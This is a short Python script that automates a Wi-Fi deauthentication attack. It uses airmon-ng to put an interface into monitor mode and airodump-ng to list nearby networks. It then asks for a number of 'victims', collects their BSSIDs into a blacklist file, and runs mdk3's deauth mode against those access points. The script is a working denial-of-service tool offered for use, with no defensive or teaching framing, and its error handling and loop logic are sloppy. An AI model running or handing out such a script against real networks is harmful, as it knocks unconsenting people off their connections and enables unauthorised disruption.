import os
import time

os.system("apt install toilet")
os.system("cd /root/Desktop/")

def start():
    try:
        open("blacklist.txt",'w+')
    except FileExistsError:
        os.system("rm blacklist.txt")
    else:
        print("Creating text file...")

    os.system("clear")
    os.system('toilet -f future "humble" --filter gay')
    time.sleep(5)
    os.system("clear")
    os.system("airmon-ng check kill")
    os.system("airmon-ng")
    interface = input('Select the interface you want to set to monitor mode: ')
    print("setting",interface,"to monitor mode...")
    time.sleep(2)
    os.system("airmon-ng start {}" .format(interface))
    mon = "mon"
    monitor = interface + mon
    print("using", monitor,"...")
    time.sleep(2)
    os.system("clear")
    os.system("airodump-ng {}" .format(monitor))
    victims = int(input("Select the number of victims: "))
    bssid_list = []
    control0 = 0
    while control0 != victims:
        control0 += 1
        bssid = input("BSSID:")
        bssid_list.append(bssid)

        black = open("blacklist.txt", 'w')
        for i in range(0,len(bssid_list)):
            print(bssid_list[i], file=black)
        black.close()

        print(bssid_list)
    print("Wait a sec there champ!...")
    time.sleep(2)
    print("final check...")
    time.sleep(1)
    print("interface...",monitor)
    time.sleep(2)
    print("Bssid check...")
    time.sleep(1)
    for i in range(0, len(bssid_list)):
        print(bssid_list[i])
    time.sleep(2)
    for i in range(0,len(bssid_list)):
        os.system("mdk3 {} d -b /root/Desktop/blacklist.txt" .format(monitor))

start()
